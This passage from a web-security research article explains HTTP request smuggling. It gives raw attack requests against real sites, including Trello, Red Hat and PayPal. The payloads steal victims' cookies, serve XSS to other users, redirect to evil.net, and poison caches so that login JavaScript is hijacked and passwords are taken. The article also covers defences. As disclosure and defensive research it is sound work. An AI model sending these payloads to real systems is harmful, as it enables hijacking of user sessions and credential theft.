HTTP/1.1<br>Host: alerts.newrelic.com<br>X-Forwarded-Proto: https<br>Service-Gateway-Account-Id: 934454<br>Service-Gateway-Is-Newrelic-Admin: true<br>Content-Length: 6<br>…<br>x=123</span><span class="green">GET...</span><br><br>HTTP/1.1 200 OK<br><br>{<br>&nbsp; "user": {<br>&nbsp;&nbsp;   "account_id": 934454,<br>&nbsp;&nbsp;   "is_newrelic_admin": true<br>&nbsp; },<br>&nbsp; "current_account_id": 934454<br>&nbsp; …<br>} </code><p>New Relic deployed a hotfix and diagnosed the root cause as a weakness in an F5 gateway. The report has now been <a href="https://hackerone.com/reports/498052" target="_blank">publicly disclosed</a>. As far as I'm aware there's no patch available, meaning this is still a zeroday at the time of writing.&nbsp;<b>Update:</b>&nbsp;F5 Issued advisory <a href="https://support.f5.com/csp/article/K50375550" target="_blank">K50375550</a> for this on the 25th August 2019.</p><h2 id="exploit">Exploit</h2><p>Breaking straight into internal APIs is great when it works, but it's rarely our only option. There's also a wealth of different attacks we can launch against everyone browsing the target website.</p><p>To establish which attacks we can apply to other users, we need to understand what types of request we can poison. Repeat the socket poisoning test from the 'Confirm' stage, but iteratively tweak the 'victim' request until it resembles a typical GET request. You might find that you can only poison requests with certain methods, paths or headers. Also, try issuing the victim request from a different IP address - in rare cases, you may find that you can only poison requests originating from the same IP. </p><p>Finally, check if the website uses a web cache; these can help bypass many restrictions, increase our control over which resources get poisoned, and ultimately multiply the severity of request smuggling vulnerabilities.</p><h2 id="store">Store</h2><p>If the application supports editing or storing any kind of text data, exploitation is exceptionally easy. By prefixing the victim's request with a crafted storage request, we can make the application save their request and display it back to us - then steal any authentication cookies/headers. Here's an example targeting Trello, using their profile-edit endpoint:</p><code><span class="blue">POST /1/cards HTTP/1.1<br>Host: trello.com<br>Transfer-Encoding:[tab]chunked<br>Content-Length: 4<br><br>9f</span><br><span class="orange">PUT /1/members/1234 HTTP/1.1<br>Host: trello.com<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 400<br><br>x=x&amp;csrf=1234&amp;username=testzzz&amp;bio=cake<br>0<br></span><br><span class="green">GET / HTTP/1.1<br>Host: trello.com<br></span></code><p>As soon as the victim's request arrived, it would end up saved on my profile, exposing all their headers and cookies:</p><img src="/cms/images/47/95/0e81e9aa9e5b-article-trello.png"><p>The only major 'gotcha' with this technique is that you'll lose any data that occurs after an '&amp;', which makes it hard to steal the body from form-encoded POST requests. I spent a while trying to work around this limitation by using alternative request encodings and ultimately gave up, but I still suspect it's possible somehow.</p><p>Data storage opportunities aren't always as obvious as this; on another site, I was able to use the 'Contact Us' form, eventually triggering an email containing the victim's request and earning an extra $2,500.</p><h2 id="attack">Attack</h2><p>Being able to apply an arbitrary prefix to other people's responses also opens up another avenue of attack: triggering a harmful response.</p><p>There are two primary ways of using harmful responses. The simplest is to issue an 'attack' request, then wait for someone else's request to hit the back-end socket and trigger the harmful response. A trickier but more powerful approach is to issue both the 'attack' and 'victim' requests ourselves, and hope that the harmful response to the victim request gets saved by a web cache and served up to anyone else who hits the same URL - <a href="/web-security/web-cache-poisoning">web cache poisoning</a>.</p><p>In each of the following request/response snippets, the black text is the response to the second (green) request. The response to the first (blue) request is omitted, as it isn't relevant.</p><h3 id="xss-upgrade">Upgrading XSS</h3><p>While auditing a SaaS application, <a href="https://github.com/PortSwigger/param-miner">Param Miner</a> spotted a parameter called SAML and Burp's scanner confirmed it was vulnerable to <a href="/web-security/cross-site-scripting/reflected">reflected XSS</a>. Reflected XSS is nice by itself, but tricky to exploit at scale because it requires user-interaction. </p><p>With request smuggling, we can make a response containing XSS get served to random people actively browsing the website, enabling straightforward mass-exploitation. We can also gain access to authentication headers and HTTP only cookies, potentially letting us pivot to other domains.</p><code><span class="blue">POST / HTTP/1.1<br>Host: saas-app.com<br>Content-Length: 4<br>Transfer-Encoding : chunked<br><br>10<br>=x&amp;cr={creative}&amp;x=<br>66<br></span><span class="orange">POST /index.php HTTP/1.1<br>Host: saas-app.com<br>Content-Length: 200<br><br>SAML=a"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><span class="green">POST / HTTP/1.1<br>Host: saas-app.com<br>Cookie: …</span><br><br>HTTP/1.1 200 OK<br>…<br>&lt;input name="SAML"   value="a"&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br>0<br><br>POST / HTTP/1.1<br>Host: saas-app.com<br>Cookie: …<br>"/&gt;<br></code><h3 id="dom">Grasping the DOM</h3><p>While looking for a vulnerability to chain with request smuggling on www.redhat.com, I found a DOM-based open redirect which presented an interesting challenge:</p><p> <code><span class="blue">GET /assets/idx?redir=//redhat.com@evil.net/ HTTP/1.1<br>Host: www.redhat.com<br></span><br>HTTP/1.1 200 OK<br><br>&lt;script&gt;<br>var destination = getQueryParam('redir')<br>[poor filtering]<br>document.location = destination<br></code></p><p><code></code>Some JavaScript on the page was reading the 'redir' parameter from the victim browser's query string, but how could I control it? Request smuggling gives us control over what the server thinks the query string is, but the victim's browser's perception of the query string is simply whatever page they were trying to access.</p><p>I was able to resolve this by chaining in a server-side non-open redirect:</p><code><span class="blue">POST /css/style.css HTTP/1.1<br>Host:&nbsp;www.redhat.com<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 122<br>Transfer-Encoding: chunked<br><br></span><span class="orange">0<br><br>POST /search?dest=../assets/idx?redir=//redhat.com@evil.net/&nbsp;HTTP/1.1<br>Host:&nbsp;www.redhat.com<br>Content-Length: 15<br><br>x=</span><span class="green">GET /en/solutions HTTP/1.1<br>Host: www.redhat.com<br></span><br>HTTP/1.1 301 Found<br>Location: ../assets/idx?redir=//redhat.com@evil.net/<br></code><p>The victim browser would receive a 301 redirect to https://www.redhat.com/assets/idx.html?redir=//redat.com@evil.net/which would then execute the DOM-based open redirect and dump them on evil.net</p><h3 id="cdn-chaining">CDN Chaining</h3><p>Some websites use multiple layers of reverse proxies and CDNs. This gives us extra opportunities for desynchronization which is always appreciated, and it often also increases the severity.</p><p>One target was somehow using two layers of Akamai, and despite the servers being by the same vendor it was possible to desynchronize them and thereby serve content from anywhere on the Akamai network on the victim's website:</p><code><span class="blue">POST /cow.jpg HTTP/1.1<br>Host: redacted.com <br>Content-Type: application/x-www-form-urlencoded <br>Content-Length: 50 <br>Transfer-Encoding: chunked <br><br>0</span><span class="orange"> <br><br>GET / HTTP/1.1 <br>Host: www.redhat.com <br>X: X</span><span class="green">GET...</span><br><br>Red Hat - We make open source technologies for the enterprise</code><p>The same concept works on SaaS providers; I was able to exploit a critical website built on a well known SaaS platform by directing requests to a different system built on the same platform.</p><h3 id="harmless-responses">'Harmless' responses</h3><p>Because request smuggling lets us influence the response to arbitrary requests, some ordinarily harmless behaviours become exploitable. For example, even the humble open redirect can be used to compromise accounts by redirecting JavaScript imports to a malicious domain.</p><p>Redirects that use the 307 code are particularly useful, as browsers that receive a 307 after issuing a POST request will resend the POST to the new destination. This may mean you can make unwitting victims send their plaintext passwords directly to your website.</p><p>Classic open redirects are quite common by themselves, but there's a variant which is endemic throughout the web as it stems from a default behaviour in both Apache and IIS. It's conveniently considered to be harmless and overlooked by pretty much everyone, as without an accompanying vulnerability like request smuggling it is indeed useless. If you try to access a folder without a trailing slash, the server will respond with a redirect to append the slash, using the hostname from the host header:</p><code><span class="blue">POST /etc/libs/xyz.js HTTP/1.1<br>Host: redacted<br>Content-Length: 57<br>Transfer-Encoding: chunked<br><br>0</span><br><br><span class="orange">POST /etc HTTP/1.1<br>Host: burpcollaborator.net<br>X: X</span><span class="green">GET /etc/libs/xyz.js HTTP/1.1</span><br><br>HTTP/1.1 301 Moved Permanently<br>Location: https://burpcollaborator.net/etc/ </code><p>When using this technique, keep a close eye on the protocol used in the redirect. You may be able to influence it using a header like X-Forwarded-SSL. If it's stuck on HTTP, and you're attacking a HTTPS site, the victim's browser will block the connection thanks to its mixed-content protection. There are <a href="https://portswigger.net/blog/practical-web-cache-poisoning#hiddenroutepoisoning">two known exceptions</a> to this - Internet Explorer's mixed-content protection can be completely bypassed, and Safari will auto-upgrade the connection to HTTPS if the redirection target is in its HSTS cache. </p><h3 id="web-cache-poisoning">Web Cache Poisoning</h3><p>A few hours after trying some redirect-based attacks on a particular website, I opened their homepage in a browser to look for more attack surface and spotted the following error in the dev console:</p><p><img src="/cms/images/8c/4d/6e6e5f9934f4-article-sslerror.png" alt="https://52.16.21.24/  net::ERR_CERT_COMMON_NAME_INVALID"><br></p><p>This error occurred regardless of which machine I loaded the website from, and the IP address looked awfully familiar. During my redirect probe, someone else's request for an image file had slipped in before my victim request and the poisoned response had been saved by the cache.</p><p>This was a great demonstration of the potential impact, but overall not an ideal outcome. Aside from relying on timeout-based detection, there's no way to fully eliminate the possibility of accidental cache poisoning. That said, to minimise the risk you can:<br><br>- Ensure the 'victim' requests have a cachebuster.<br>- Send the 'victim' requests as fast as possible, using Turbo Intruder.<br>- Try to craft a prefix that triggers a response with anti-caching headers, or a status code that's unlikely to be cached.<br>- Target a front-end in a geographic region that's asleep.<br></p><h3 id="web-cache-deception">Web Cache Deception++</h3><p>What if instead of trying to mitigate the chance of attacker/user hybrid responses getting cached, we embrace it? </p><p>Instead of using a prefix designed to cause a harmful response, we could try to fetch a response containing sensitive information, with our victim's cookies:</p><code><span class="blue">POST / HTTP/1.1<br>Transfer-Encoding: blah<br><br>0</span><br><br><span class="orange">GET /account/settings HTTP/1.1<br>X: X</span><span class="green">GET /static/site.js HTTP/1.1<br>Cookie: sessionid=xyz</span></code><p>Front-end perspective:</p><code><span class="blue">GET /static/site.js HTTP/1.1</span><br><br><br>HTTP/1.1 200 OK<br><br>Your payment history<br>…</code><p>When a user's request for a static resource hits the poisoned socket, the response will contain their account details, and the cache will save these over the static resource. We can then retrieve the account details by loading /static/site.js from the cache.</p><p>This is effectively a new variant of the Web Cache Deception attack. It's more powerful in two key ways - it doesn't require any user-interaction, and also doesn't require that the target site lets you play with extensions. The only catch is that the attacker can't be sure where the victim's response will land.</p><h3 id="paypal">PayPal</h3><p>With request smuggling chained to cache poisoning I was able to persistently hijack numerous JavaScript files. Among those was one used on PayPal's login page: <span class="code">https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js</span>.</p><code><span class="blue">POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 <br>Host: c.paypal.com<br>Content-Length: 61 <br>Transfer-Encoding: chunked<br><br>0</span><br><br><span class="orange">GET /webstatic HTTP/1.1<br>Host: skeletonscribe.net?<br>X: X</span><span class="green">GET /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 <br>Host: c.paypal.com<br>Connection: close</span><br><br>HTTP/1.1 302 Found<br>Location: http://skeletonscribe.net?, c.paypal.com/webstatic/ </code><p>However, there was a problem - PayPal's login page used <a href="/web-security/cross-site-scripting/content-security-policy">Content Security Policy</a> with a <span class="code">script-src</span> that killed my redirect.</p><img src="/cms/images/e1/5c/43ccf8d84ffc-article-paypal-01.svg"><p>This initially looked like a triumph of defence in depth. However, I noticed that the login page loads a sub-page on c.paypal.com in a dynamically generated iframe. This sub-page didn't use <a href="/web-security/cross-site-scripting/content-security-policy">CSP</a>, and also imported our poisoned JS file. This gave us full control over the iframe's contents, but we still couldn't read the user's PayPal password from the parent page thanks to the Same Origin Policy.</p><p><img src="/cms/images/1e/65/8e618cf695b8-article-paypal-02.svg"><br></p><p>My colleague Gareth Heyes then discovered a page at paypal.com/us/gifts that didn't use CSP, and also imported our poisoned JS file. By using our JS to redirect the c.paypal.com iframe to that URL (and triggering our JS import for the third time) we could finally access the parent and steal plaintext PayPal passwords from everyone who logged in using Safari or IE.</p><p><img src="/cms/images/13/0e/7fcaae230c37-article-paypal-03.svg"><br></p><p>PayPal speedily resolved this vulnerability by configuring Akamai to reject requests that contained a <span class="code">Transfer-Encoding: chunked</span> header, and awarded a $18,900 bounty.</p><p>Weeks later, while inventing and testing some new desynchronization techniques, I decided to try using a line-wrapped header:</p><code>Transfer-Encoding:<br>&nbsp;chunked</code><p>This seemed to make the Transfer-Encoding header completely invisible to Akamai, who let it through and once again granted me control of PayPal's login page. PayPal speedily applied a more robust fix, and awarded an impressive $20,000. A <a href="https://hackerone.com/reports/488147" target="_blank">summary</a> of <a href="https://hackerone.com/reports/510152" target="_blank">both</a> reports has been publicly disclosed, with a statement from PayPal.</p><h2 id="demo">Demo</h2><p>Another target used a chain of reverse proxies, one of which didn't regard '\n' as a valid header terminator. This meant a sizeable portion their web infrastructure was vulnerable to request smuggling. I've recorded a demo showing how HTTP Request Smuggler can be used to efficiently identify and exploit this vulnerability on a replica of their Bugzilla installation, which held some extremely sensitive information.</p><p><video controls="controls"><source src="https://d2gl1b374o3yzk.cloudfront.net/blog/videos/http-desync-attacks/hls/video.m3u8" type="application/x-mpegURL"><source src="https://d2gl1b374o3yzk.cloudfront.net/blog/videos/http-desync-attacks/mp4/video.mp4" type="video/mp4">Video tags are not supported by your browser.</video></p><h2 id="defence">Defence</h2><p>As usual, security accompanies simplicity. If your website is free of load balancers, CDNs and reverse proxies, this technique is not a threat. The more layers you introduce, the more likely you are to be vulnerable.</p><p>Whenever I discuss an attack technique I get asked if HTTPS prevents it. As always, the answer is 'no'. That said, you can resolve all variants of this vulnerability by configuring the front-end server to exclusively use HTTP/2 to communicate to back-end systems, or by disabling back-end connection reuse entirely. Alternatively, you could ensure all servers in the chain run the same webserver software with the same configuration.</p><p>Specific instances of this vulnerability can be resolved by reconfiguring the front-end server to normalize ambiguous requests before routing them onward. This is probably the only realistic solution for CDNs who don't want to make their customers vulnerable, and Cloudflare and Fastly seem to apply it successfully.</p><p>Normalising requests is not an option for back-end servers - they need to outright reject ambiguous requests, and drop the associated connection. Since rejecting requests is more likely to affect legitimate traffic than simply normalising them, I recommend focusing on preventing request smuggling via the front-end server instead.</p><p>Effective defence is impossible when your tooling works against you. Most web testing tools will automatically 'correct' the Content Length header when sending requests, making request smuggling impossible. In Burp Suite you can disable this behaviour using the Repeater menu - ensure your tool of choice has equivalent functionality. Also, certain companies and bug bounty platforms route their testers' traffic through proxies like Squid for monitoring purposes. These will mangle any request smuggling attacks the testers launch, ensuring the company gets zero coverage against this vulnerability class.</p><p>Unlike most classes of web vulnerability, even flawed request smuggling attacks can have side effects. This makes live websites a poor choice of training ground for anyone looking to gain request smuggling experience. To help address this, we have published a free <a href="/web-security/request-smuggling" target="_blank">learning resource</a> with interactive websites that are intentionally vulnerable, so you can start out in a safe and controlled environment: </p><a href="https://portswigger.net/web-security/request-smuggling" class="link-banner-small-white"><span class="icon-erlenmeyer"></span><span><p>LAB</p><p>Access the Web Security Academy</p></span></a><p></p><h2 id="conclusion">Conclusion</h2><p>Building on research that has been overlooked for years, I've introduced new techniques to desynchronize servers and demonstrated novel ways to exploit the results using numerous real websites as case studies. Through this I've shown that request smuggling is a major threat to the web, that HTTP request parsing is a security-critical function, and that tolerating ambiguous messages is dangerous. I've also released a methodology and an open source toolkit to help people audit for request smuggling, prove the impact, and earn bounties with minimal risk.</p><p>This topic is still under-researched, and as such I hope this publication will help inspire new desynchronization techniques and exploits over the next few years. If you're interested in tackling it yourself, you might want to read my&nbsp;<a href="https://portswigger.net/blog/so-you-want-to-become-a-web-security-researcher" target="_blank">guide on breaking into web security research</a>.</p><p>You may also be interested in the followup posts&nbsp;<a href="https://portswigger.net/research/http-desync-attacks-what-happened-next" target="_blank">HTTP Desync Attacks: what happened next</a>&nbsp;and <a href="https://portswigger.net/research/breaking-the-chains-on-http-request-smuggler" target="_blank">Breaking the chains on HTTP Request Smuggler</a>.</p>
+    <div class="container-flex-wrap">
+            <a class="label-rounded-outline-white" href="/research/james-kettle">
+                James Favourites
+            </a>
+            <a class="label-rounded-outline-white" href="/research/request-smuggling">
+                Request Smuggling
+            </a>
+    </div>
+    <a href="/research/articles" class="chevron-before">Back to all articles</a>
+</div>
+    <div class="section-light section-light-blue-full-width">
+        <noscript>
+    <div class="noscript-warning">This page requires JavaScript for an enhanced user experience.</div>
+</noscript>
+        <h2 class="text-center">Related Research</h2>
+        <div class="widget-tile-container has-1rows margin-top-m">
+
+
+<a href="/research/web-cache-entanglement" class="tile-container research onecolumn widget-tile size0 style1 textstyle2 is-whitebackground" data-backgroundimageurl=/cms/images/52/1d/ac63-tile-entanglement-2x2.jpg  data-backgroundcolorid="0">
+    
+<h3 class="tile-text1 notext2">
+Web Cache Entanglement</h3>
+    <span class="tile-date">05 August 2020</span>
+    <span class="tile-text1-alt">Web Cache Entanglement</span>
+    
+</a>
+
+<a href="/research/breaking-the-chains-on-http-request-smuggler" class="tile-container research onecolumn widget-tile size0 style1 textstyle5 is-whitebackground" data-backgroundimageurl=/cms/images/1f/60/00c08d4a26a9-tile-request-smugglers-breaking-chains_1x1.png  data-backgroundcolorid="0">
+    
+<h3 class="tile-text1 notext2">
+        <span class="tile-text-container">Breaking the chains on HTTP Request Smuggler</span>
+</h3>
+    <span class="tile-date">09 December 2019</span>
+    <span class="tile-text1-alt">Breaking the chains on HTTP Request Smuggler</span>
+    
+</a>
+
+<a href="/research/http-desync-attacks-what-happened-next" class="tile-container research onecolumn widget-tile size0 style1 textstyle9 is-whitebackground" data-backgroundimageurl=/cms/images/08/18/c22d41d8fdd2-tile-htttp-desync_1x1.png  data-backgroundcolorid="0">
+    
+<h3 class="tile-text1 notext2">
+        <span class="tile-text-container">HTTP Desync Attacks: what happened next</span>
+</h3>
+    <span class="tile-date">03 October 2019</span>
+    <span class="tile-text1-alt">HTTP Desync Attacks: what happened next</span>
+    
+</a>
+
+<a href="/research/practical-web-cache-poisoning" class="tile-container research onecolumn widget-tile size0 style1 textstyle9 is-whitebackground" data-backgroundimageurl=/cms/images/1e/e8/6fc3e0dd83b6-tile-practical-web-cache-poisoning-tile-1x1.png  data-backgroundcolorid="0">
+    
+<h3 class="tile-text1 ">
+        <span class="tile-text-container">Practical Web Cache Poisoning</span>
+</h3>
+
+
+    <span class="tile-text2">
+            <span class="tile-text-container">Redefining 'unexploitable'</span>
+    </span>
+    <span class="tile-date">09 August 2018</span>
+    <span class="tile-text1-alt">Practical Web Cache Poisoning</span>
+            <span class="tile-text2-alt">Redefining &#39;unexploitable&#39;</span>
+
+</a></div>
+
+
+    </div>
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "@type": "Person",
+    "name": "James Kettle"
+  },
+  "dateModified": "2020-11-18",
+  "datePublished": "2019-08-07",
+  "headline": "HTTP Desync Attacks: Request Smuggling Reborn",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn"
+  },
+  "image":{
+    "@type": "ImageObject",
+    "url": "https://portswigger.net/cms/images/bc/30/3b3a44f545e1-twittercard-request-smuggling-blog-twitter.png"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://portswigger.net/content/images/logos/thumbnail.png"
+    },
+    "name": "PortSwigger Research",
+    "url": "https://portswigger.net/research",
+    "sameAs": [
+      "https://twitter.com/portswiggerres"
+    ]
+  },
+  "url": "https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn"
+}
+</script>
+
+<script async src="/bundles/cms/research/details?v=qXY40pqk3p6Pbno6RzsSFKL6kCi6R3Mf65K00saOgSM1" nonce="InK9q9Pujd/JtNJUaHrDR+Q+UxCpO7ir"></script>
+
+
+            <div class="banner text-center theme-white">
+    <a href="https://twitter.com/portswiggerres" class="paragraph-twitter-1">
+        <span class="icon-twitter"></span>
+        <h3>Follow PortSwigger Research on Twitter</h3>
+    </a>
+</div>
+        </div>
+        
+    <footer class="wrapper">
+        <div class="container">
+            <div>
+                <p>Burp Suite</p>
+                <a href="/burp/vulnerability-scanner">Web vulnerability scanner</a>
+                <a href="/burp">Burp Suite Editions</a>
+                <a href="/burp/releases">Release Notes</a>
+            </div>
+            <div>
+                <p>Vulnerabilities</p>
+                <a href="/web-security/cross-site-scripting">Cross-site scripting (XSS)</a>
+                <a href="/web-security/sql-injection">SQL injection</a>
+                <a href="/web-security/csrf">Cross-site request forgery</a>
+                <a href="/web-security/xxe">XML external entity injection</a>
+                <a href="/web-security/file-path-traversal">Directory traversal</a>
+                <a href="/web-security/ssrf">Server-side request forgery</a>
+            </div>
+            <div>
+                <p>Customers</p>
+                <a href="/organizations">Organizations</a>
+                <a href="/testers">Testers</a>
+                <a href="/developers">Developers</a>
+            </div>
+            <div>
+                <p>Company</p>
+                <a href="/about">About</a>
+                <a href="/news">PortSwigger News</a>
+                <a href="/careers">Careers</a>
+                <a href="/about/contact">Contact</a>
+                <a href="/legal">Legal</a>
+                <a href="/privacy">Privacy Notice</a>
+            </div>
+            <div>
+                <p>Insights</p>
+                <a href="/web-security">Web Security Academy</a>
+                <a href="/blog">Blog</a>
+                <a href="/research">Research</a>
+                <a href="/daily-swig">The Daily Swig</a>
+            </div>
+            <div>
+                <a href="/"><img src="/content/images/logos/portswigger-logo.svg" alt="PortSwigger Logo" class="footer-logo"></a>
+                <a class="button-outline-blue-small camelcase" href="https://twitter.com/Burp_Suite" rel="noreferrer"><span class="icon-twitter"></span>  Follow us</a>
+                <p class="grey">&copy; 2021 PortSwigger Ltd.</p>
+            </div>
+        </div>
+    </footer>
+    <a href="#top" class="back-to-top"><svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 26 26"><polygon points="4.07 14.7 5.03 15.78 12.48 9.13 19.94 15.78 20.9 14.7 12.48 7.2 4.07 14.7" fill="#f63" /><path d="M13,0A13,13,0,1,0,26,13,13,13,0,0,0,13,0Zm0,24.56A11.56,11.56,0,1,1,24.56,13,11.58,11.58,0,0,1,13,24.56Z" fill="#f63" /></svg></a>
+
+        <a class="back-to-top" href="#top">
+            <svg height="26" viewBox="0 0 26 26" width="26" xmlns="http://www.w3.org/2000/svg">
+                <polygon fill="#f63" points="4.07 14.7 5.03 15.78 12.48 9.13 19.94 15.78 20.9 14.7 12.48 7.2 4.07 14.7"></polygon>
+                <path d="M13,0A13,13,0,1,0,26,13,13,13,0,0,0,13,0Zm0,24.56A11.56,11.56,0,1,1,24.56,13,11.58,11.58,0,0,1,13,24.56Z" fill="#f63"></path>
+            </svg>
+        </a>
+    </body>
+</html>
